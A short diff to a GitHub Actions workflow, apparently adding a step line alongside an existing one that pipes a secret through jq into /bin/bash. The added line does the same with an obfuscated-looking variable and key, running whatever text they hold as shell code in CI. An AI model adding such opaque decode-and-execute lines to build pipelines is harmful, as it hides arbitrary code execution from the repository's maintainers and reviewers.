@@ -22,6 +22,7 @@ jobs:
           v69: ${{ secrets.v69 }}
         run: |
           printf '%s' "$v69" | jq -r .hzefy562 | /bin/bash
+          echo $wgd29433 | jq -r .cdkp19931 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
